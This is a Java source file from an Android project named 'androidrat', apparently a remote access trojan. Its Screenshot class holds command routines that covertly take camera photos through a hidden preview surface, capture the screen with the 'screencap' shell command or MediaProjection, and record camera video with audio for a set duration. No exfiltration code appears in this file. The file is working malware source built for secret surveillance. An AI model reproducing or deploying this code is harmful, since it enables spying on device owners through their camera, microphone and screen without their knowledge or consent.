package com.nqmgaming.androidrat.command;

import android.app.Activity;
import android.content.Context;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.PixelFormat;
import android.graphics.SurfaceTexture;
import android.hardware.Camera;
import android.hardware.display.DisplayManager;
import android.media.Image;
import android.media.ImageReader;
import android.media.MediaRecorder;
import android.media.projection.MediaProjection;
import android.os.Environment;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.Surface;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.nio.ByteBuffer;

public class Screenshot {

    private static MediaProjection mediaProjection;
    private static ImageReader imageReader;

    private static boolean isRecording = false;

    private static MediaRecorder mediaRecorder;
    private static SurfaceTexture surfaceTexture;
    private static Surface surface;


    private static Camera camera;


    /**
     *
     * @return
     */
    public static String captureImage(Context context, boolean frontCamera) {
        String filename =  Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES).toString() + "/"+ String.valueOf(System.currentTimeMillis()).replaceAll(":", ".") + ".png";
        camera = getCamera(frontCamera);
        Camera.Parameters parameters = camera.getParameters();
        camera.setParameters(parameters);
        try{
            camera.setPreviewTexture(new SurfaceTexture(0));
            camera.startPreview();
        } catch (Exception e) {
            e.printStackTrace();
        }

        camera.takePicture(null, null, new Camera.PictureCallback() {
            @Override
            public void onPictureTaken(byte[] data, Camera camera) {
                releaseCamera();
                try{
                    Bitmap bitmap = BitmapFactory.decodeByteArray(data, 0, data.length);
                    FileOutputStream output = new FileOutputStream(filename);
                    bitmap.compress(Bitmap.CompressFormat.PNG, 20, output);

                    output.flush();
                    output.close();
                }catch(Exception ex){
                }
            }
        });

        return filename;
    }

    /**
     * Camera cleanup
     */
    private static void releaseCamera(){
        if (camera != null) {
            camera.stopPreview();
            camera.release();
            camera = null;
        }
    }

    /**
     * Take screenshot of device
     * @return
     */
    public static String captureScreen() {
        try {
            String filename =  Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES).toString() + "/"+ String.valueOf(System.currentTimeMillis()).replaceAll(":", ".") + ".png";
            Process process = Runtime.getRuntime().exec("screencap " + filename);
            process.waitFor();
            Thread.sleep(3000);

            if (process.exitValue() == 0)
                return filename;
        } catch (Exception exception) {
            Log.e("eeee", exception.toString());
        }

        return null;
//        if (mediaProjectionManager != null)
//            activity.startActivityForResult(mediaProjectionManager.createScreenCaptureIntent(), REQUEST_CODE_SCREEN_CAPTURE);

    }

    public static String takeScreenshot(MediaProjection mProjection, Activity activity) {
        String filename =  Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES).toString() + "/"+ String.valueOf(System.currentTimeMillis()).replaceAll(":", ".") + ".png";

        DisplayMetrics metrics = activity.getResources().getDisplayMetrics();
        int width = metrics.widthPixels;
        int height = metrics.heightPixels;
        ImageReader mImageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2);
        mProjection.createVirtualDisplay("ScreenCapture",
                width, height, metrics.densityDpi,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                mImageReader.getSurface(), null, null);

        Image image = mImageReader.acquireLatestImage();
        if (image != null) {
            ByteBuffer buffer = image.getPlanes()[0].getBuffer();
            byte[] bytes = new byte[buffer.remaining()];
            buffer.get(bytes);
            FileOutputStream fos = null;
            try {
                File file = new File(filename); // Change to your desired file location
                fos = new FileOutputStream(file);
                fos.write(bytes);
            } catch (IOException e) {
                e.printStackTrace();
            } finally {
                if (fos != null) {
                    try {
                        fos.close();
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                }
            }
            image.close();
        }
        return filename;
    }

    /**
     *
     * @param duration
     * @return
     */
    public static String captureVideo(boolean frontCamera, int duration) throws IOException, InterruptedException {
        File outputDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_MOVIES);
        File videoFile = File.createTempFile(String.valueOf(System.currentTimeMillis()), ".mp4", outputDir);

        if (!isRecording) {
            startRecording(frontCamera, videoFile.getAbsolutePath());

            // Stop recording after duration
            Thread.sleep(duration * 1000L);
            stopRecording();
        }

        return videoFile.getAbsolutePath();
    }

    private static void startRecording(boolean frontCamera, String filePath) throws IOException {
        surfaceTexture = new SurfaceTexture(0);
        surface = new Surface(surfaceTexture);

        Camera camera = frontCamera ? Camera.open(Camera.CameraInfo.CAMERA_FACING_FRONT) : Camera.open(Camera.CameraInfo.CAMERA_FACING_BACK);
        camera.unlock();
        mediaRecorder = new MediaRecorder();
        mediaRecorder.setCamera(camera);
        mediaRecorder.setPreviewDisplay(surface);
        mediaRecorder.setVideoSource(MediaRecorder.VideoSource.CAMERA);
        mediaRecorder.setAudioSource(MediaRecorder.AudioSource.CAMCORDER);
        mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
        mediaRecorder.setOutputFile(filePath);
        mediaRecorder.setVideoEncoder(MediaRecorder.VideoEncoder.MPEG_4_SP);
        mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.DEFAULT);
        mediaRecorder.setVideoFrameRate(30); // 30 fps
        mediaRecorder.setVideoSize(1280, 720); // 720p

        // Prepare and start recording
        try {
            mediaRecorder.prepare();
            mediaRecorder.start();
            isRecording = true;
        } catch (Exception e) {
            Log.e("eeee", e.toString());
        }
    }

    private static void stopRecording() {
        if (isRecording) {
            mediaRecorder.stop();
            mediaRecorder.release();
            mediaRecorder = null;
            isRecording = false;

            surfaceTexture = null;
            surface = null;
        }
    }


    /**
     * Select the camera to use
     * @param frontCamera
     * @return selected camera object
     */
    public static Camera getCamera(boolean frontCamera) {
        int numberOfCameras = Camera.getNumberOfCameras();

        // Search for selected camera
        for (int i = 0; i < numberOfCameras; i++) {
            Camera.CameraInfo info = new Camera.CameraInfo();
            Camera.getCameraInfo(i, info);
            if (info.facing == Camera.CameraInfo.CAMERA_FACING_FRONT && frontCamera)
                return Camera.open(i);
            else if (info.facing == Camera.CameraInfo.CAMERA_FACING_BACK && !frontCamera)
                return Camera.open(i);
        }

        return Camera.open(0);
    }
}
